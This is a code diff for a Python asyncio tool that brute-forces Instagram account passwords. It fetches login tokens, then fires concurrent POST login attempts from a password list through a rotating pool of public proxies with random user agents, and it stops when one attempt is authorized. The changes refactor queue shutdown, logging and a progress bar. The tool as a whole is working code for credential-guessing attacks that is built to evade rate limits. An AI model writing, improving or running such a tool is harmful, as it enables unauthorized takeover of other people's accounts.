@@ -13,7 +13,7 @@ from app import settings
 from app.lib import exceptions
 from app.logging import AppLogger
 from app.lib.utils import (
-    get_token_from_response, limited_as_completed, read_proxies)
+    get_token_from_response, limited_as_completed, read_proxies, bar)
 
 from app.lib.models import (
     InstagramResult, LoginAttemptContext, LoginContext, TokenContext, Proxy)
@@ -35,47 +35,52 @@ class results_handler(handler):
     __name__ = 'Results Handler'
 
     async def consume(self, loop, stop_event):
-
+        """
+        Since this consumer is at the bottom of the entire tree (i.e. only
+        receiving information after all other consumers), we don't have to wait
+        for a stop event in the loop, we can just break out of it.
+        """
         index = 0
-        while not stop_event.is_set():
-            self.log.info('Awaiting result')
+        while True:
             result = await self.results.get()
-            if not result or not result.conclusive:
-                raise exceptions.FatalException(
-                    "Result should be valid and conslusive."
-                )
+
+            # Producer emits None if we are done processing passwords.
+            if result is None:
+                break
 
             index += 1
+
+            # TODO: Cleanup how we are doing the percent complete operation,
+            # maybe try to use progressbar package.
             self.log.notice("{0:.2%}".format(float(index) / self.config.user.num_passwords))
             self.log.notice(result)
 
             if result.authorized:
-                self.log.notice(result)
-                self.log.notice(result.context.password)
-
+                self.log.debug('Setting Stop Event')
                 stop_event.set()
-                return
+                break
 
             else:
-                self.log.error(result)
-
-            self.log.info('Awaiting putting in attmepts')
-            await self.attempts.put(result.context.password)
-        self.log.info('Stop Event Noticed')
+                self.log.error("Not Authenticated", extra={'password': result.context.password})
+                await self.attempts.put(result.context.password)
 
     async def dump(self):
-        log = AppLogger('Dumping Password Attempts')
-        log.notice('Starting...')
-
         attempts_list = []
         while not self.attempts.empty():
             attempts_list.append(await self.attempts.get())
         self.config.user.update_password_attempts(attempts_list)
-        log.notice('Finished...')
 
 
 class proxy_handler(handler):
+    """
+    TODO: This could be cleaned up a bit, with the validation in particular.
+    It might be worthwhile looking into whether or not we can subclass the
+    asyncio.Queue() so we don't have to have the methods on this handler and
+    pass the handler around.
 
+    The logic in here definitely needs to be looked at and cleaned up, particularly
+    in terms of the order we are validating and when we are validating the proxies.
+    """
     __name__ = 'Proxy Handler'
     __urls__ = {
         'GET': settings.INSTAGRAM_URL,
@@ -84,14 +89,21 @@ class proxy_handler(handler):
 
     def __init__(self, proxy_pool, *args, method='GET'):
         super(proxy_handler, self).__init__(*args)
-
         self.method = method
-        self.pool = proxy_pool
-        self.proxy_list = []
-        self.proxies = asyncio.Queue()
-        self.scheme = urlparse(self.__urls__[method]).scheme
 
-    async def prepopulate(self):
+        # Proxies we read from .txt files on prepopulate and then proxies we
+        # get from server during live run.
+        self.proxies = asyncio.Queue()
+
+        # TODO: See if we can create these objects directly in the handler,
+        # with the broker as well.
+        self.pool = proxy_pool
+
+    @property
+    def scheme(self):
+        return urlparse(self.__urls__[self.method]).scheme
+
+    async def produce(self):
         """
         When initially starting, it sometimes takes awhile for the proxies with
         valid credentials to populate and kickstart the password consumer.
@@ -105,8 +117,6 @@ class proxy_handler(handler):
 
     async def consume(self, loop, stop_event):
         # Introduce timeout for waiting for first proxy.
-        await self.prepopulate()
-
         while not stop_event.is_set():
             try:
                 proxy = await self.pool.get(scheme=self.scheme)
@@ -117,28 +127,26 @@ class proxy_handler(handler):
                 self.log.warning(e)
 
             else:
-                # self.log.info('Trying to add proxy...')
-                # self.log.info('Error Rate: %s, Avg Resp Time: %s' %
-                #     (proxy.error_rate, proxy.avg_resp_time))
                 proxy = Proxy.from_broker_proxy(proxy)
+                # TODO: Move these values to settings.
                 if proxy.error_rate <= 0.5 and proxy.avg_resp_time <= 5.0:
                     # Should we maybe check proxy verifications before we put the
                     # proxy in the queue to begin with?
                     await self.put(proxy, update_time=False)
 
-        self.log.info('Stop Event Noticed')
+        self.log.debug('Stop Event Noticed')
+        await self.put(None)
 
     async def put(self, proxy, update_time=True):
-        if update_time:
+        if proxy and update_time:
             proxy.last_used = datetime.now()
         await self.proxies.put(proxy)
-        # self.log.notice('Num Proxies %s' % self.proxies.qsize())
-        # self.proxy_list.append(proxy)
 
     async def validate_proxy(self, proxy):
         if not proxy.last_used:
             return True
         else:
+            # TODO: Move this value to settings.
             if proxy.time_since_used() >= 10:
                 return True
             else:
@@ -146,23 +154,13 @@ class proxy_handler(handler):
                 self.proxy_list.append(proxy)
                 return False
 
-    async def get_from_list(self):
-        while True:
-            # proxy = await self.proxies.get()
-            if len(self.proxy_list) == 0:
-                continue
-
-            proxy = self.proxy_list.pop(0)
-
-            # Should we maybe check these verifications before we put the
-            # proxy in the queue to begin with?
-            valid = await self.validate_proxy(proxy)
-            if valid:
-                return proxy
-
     async def get_from_queue(self):
         while True:
             proxy = await self.proxies.get()
+
+            # Emit None to Alert Consumer to Stop Listening
+            if proxy is None:
+                break
 
             # Should we maybe check these verifications before we put the
             # proxy in the queue to begin with?
@@ -171,16 +169,23 @@ class proxy_handler(handler):
                 return proxy
 
     async def get(self):
-        # TODO: Move the allowed timeout for finding a given proxy that satisfies
-        # reauirements to settings.
-        # We will set the timeout very high right now, because it sometimes takes
-        # awhile for the proxies to build up - setting this low causes it to fail
-        # during early stages of login attempts.
+        """
+        TODO
+        ----
+        Move the allowed timeout for finding a given proxy that satisfies
+        reauirements to settings.
+
+        We will set the timeout very high right now, because it sometimes takes
+        awhile for the proxies to build up - setting this low causes it to fail
+        during early stages of login attempts.
+        """
         with stopit.SignalTimeout(50) as timeout_mgr:
             proxy = await self.get_from_queue()
             if proxy:
                 if proxy.time_since_used():
-                    self.log.notice('Returning Proxy %s Used %s Seconds Ago' %
+                    # TODO: Make this debug level once we are more comfortable
+                    # with operation.
+                    self.log.info('Returning Proxy %s Used %s Seconds Ago' %
                         (proxy.host, proxy.time_since_used()))
 
         if timeout_mgr.state == timeout_mgr.TIMED_OUT:
@@ -196,6 +201,12 @@ class request_handler(handler):
     def __init__(self, *args):
         super(request_handler, self).__init__(*args)
         self.user_agent = random.choice(settings.USER_AGENTS)
+
+    def _notify_request(self, context, retry=1):
+        message = f'Sending {self.__method__} Request'
+        if retry != 1:
+            message = f'Sending {self.__method__} Request, Retry {retry}'
+        self.log.debug(message, extra={'context': context})
 
     def _headers(self):
         headers = settings.HEADER.copy()
@@ -227,9 +238,14 @@ class request_handler(handler):
 class token_handler(request_handler):
 
     __name__ = 'Token Handler'
+    __method__ = 'GET'
 
     def __init__(self, proxy_handler, *args):
         super(token_handler, self).__init__(*args)
+
+        # TODO: See if we can initialize the server for GET and POST proxies
+        # in the handlers themselves, or potentially subclass the asyncio.Queue()\
+        # for proxies.
         self.proxy_handler = proxy_handler
 
     def _get_token_from_response(self, response):
@@ -237,12 +253,6 @@ class token_handler(request_handler):
         if not token:
             raise exceptions.TokenNotInResponse()
         return token
-
-    def _notify_request(self, context, retry=1):
-        message = 'Sending GET Request'
-        if retry != 0:
-            message = f'Sending GET Request, Retry {retry + 1}'
-        self.log.info(message, extra={'context': context})
 
     async def fetch(self, session):
 
@@ -306,19 +316,25 @@ class token_handler(request_handler):
 
                 if timeout_mgr.state == timeout_mgr.TIMED_OUT:
                     raise exceptions.InternalTimeout("Timed out waiting for token.")
-                stop_event.set()
 
+                self.log.debug('Setting Stop Event')
+                stop_event.set()
                 return token
 
 
 class password_handler(request_handler):
 
     __name__ = 'Login Handler'
+    __method__ = 'POST'
 
-    def __init__(self, proxy_handler, passwords, *args):
+    def __init__(self, proxy_handler, *args):
         super(password_handler, self).__init__(*args)
+        self.passwords = asyncio.Queue()
+
+        # TODO: See if we can initialize the server for GET and POST proxies
+        # in the handlers themselves, or potentially subclass the asyncio.Queue()\
+        # for proxies.
         self.proxy_handler = proxy_handler
-        self.passwords = passwords
 
     def _login_data(self, password):
         return {
@@ -330,12 +346,6 @@ class password_handler(request_handler):
         headers = super(password_handler, self)._headers()
         headers[settings.TOKEN_HEADER] = token
         return headers
-
-    def _notify_request(self, context, retry=1):
-        message = 'Sending POST Request'
-        if retry != 1:
-            message = f'Sending POST Request, Retry {retry}'
-        self.log.info(message, extra={'context': context})
 
     async def _get_result_from_response(self, response, context):
         try:
@@ -357,17 +367,13 @@ class password_handler(request_handler):
         via a `checkpoint_required` value, we cannot raise_for_status until after
         we try to first get the response json.
         """
-        log = AppLogger('Handling Client Response')
-
         if response.status >= 400 and response.status < 500:
-            log.debug('Response Status Code : %s' % response.status)
             if response.status == 400:
                 return await self._get_result_from_response(response, context)
             else:
                 response.raise_for_status()
         else:
             try:
-                log.debug('Creating Result from Response')
                 return await self._get_result_from_response(response, context)
             except exceptions.ResultNotInResponse as e:
                 raise exceptions.FatalException(
@@ -418,7 +424,7 @@ class password_handler(request_handler):
                 password=parent_context.password,
                 token=parent_context.token
             )
-            # self._notify_request(context, retry=attempt)
+            self._notify_request(context, retry=attempt)
 
             try:
                 async with session.post(
@@ -442,6 +448,7 @@ class password_handler(request_handler):
                         if not result:
                             raise exceptions.FatalException("Result should not be None here.")
 
+                        # Put proxy back in so that it can be reused.
                         await self.proxy_handler.put(proxy)
                         return result
 
@@ -476,6 +483,10 @@ class password_handler(request_handler):
                     return await try_with_proxy(attempt=attempt + 1)
                 elif e.errno == 24:
                     asyncio.sleep(3)
+                    self.log.error(e, extra={
+                        'context': context,
+                        'other': f'Sleeping for {3} seconds...'
+                    })
                     return await try_with_proxy(attempt=attempt + 1)
                 else:
                     raise e
@@ -496,37 +507,37 @@ class password_handler(request_handler):
 
         return await try_with_proxy()
 
-    async def attempt_login(self, session, token, password, index=0):
-        """
-        TODO
-        -----
-        Should we incorporate some type of time limit here for waiting to
-        get a valid response.
-        """
-
-        # Maybe we should just try to notify of attempts beginning for password
-        # instead of each individual attempt.
-        context = LoginContext(index=index, token=token, password=password)
-        result = await self.fetch(session, context)
-
-        if result and result.conclusive:
-            self.log.debug('Got Conclusive Result')
-            return result
-
-    async def produce(self, loop, stop_event):
+    async def produce(self, loop):
         for password in self.config.user.get_new_attempts(
-                limit=self.config.password_limit):
-            self.log.info('PUtting in pw %s' % password)
-            self.passwords.put_nowait(password)
+            limit=self.config.password_limit
+        ):
+            await self.passwords.put(password)
 
-    async def consume(self, loop, stop_event, token, handle_results):
+    async def consume(self, loop, stop_event, token):
         tasks = []
 
-        def task_done(result):
-            self.log.notice('Got Result %s' % result.result())
-            self.results.put_nowait(result.result())
+        if self.passwords.qsize() == 0:
+            self.log.error('No Passwords to Try')
+            stop_event.set()
+
+        progress = bar(label='Attempting Login', max_value=self.passwords.qsize())
+
+        def task_done(fut):
+            result = fut.result()
+            if not result or not result.conclusive:
+                raise exceptions.FatalException(
+                    "Result should be valid and conslusive."
+                )
+
+            # TODO: Make sure we do not run into any threading issues with this
+            # potentially not being thread safe.  We might have to go back
+            # to using the limited_as_completed method instead.
+            progress.update()
+            self.results.put_nowait(result)
 
         while not stop_event.is_set():
+            progress.start()
+
             async with aiohttp.ClientSession(
                 connector=self.connector,
                 timeout=self.timeout
@@ -534,17 +545,29 @@ class password_handler(request_handler):
 
                 index = 0
                 while not self.passwords.empty():
-                    pw = self.passwords.get_nowait()
-                    task = asyncio.create_task(self.attempt_login(session, token, pw, index=index))
+                    password = await self.passwords.get()
+                    context = LoginContext(index=index, token=token, password=password)
+
+                    task = asyncio.create_task(self.fetch(session, context))
                     task.add_done_callback(task_done)
                     tasks.append(task)
-                    # yield self.attempt_login(session, token, pw, index=index)
 
+                self.log.debug(f'Awaiting {len(tasks)} Password Tasks...')
                 await asyncio.gather(*tasks)
+                self.log.debug('Setting Stop Event')
+
                 stop_event.set()
 
-        self.log.info('Stop Event Noticed')
-        handle_results.consume.cancel()
+        progress.finish()
+        self.log.debug('Stop Event Noticed')
+
+        # Indicate Results Producer is Done Producing
+        await self.results.put(None)
+
+        # TODO: If the task_done() callback is not thread safe because of the
+        # inability to call await self.results.put(result), we might have to go
+        # back to using asyncio.as_completed() or limited_as_completed():
+        #
         # for fut in asyncio.as_completed(tasks):
         #     fut = await fut
         #     await self.results.put(fut)
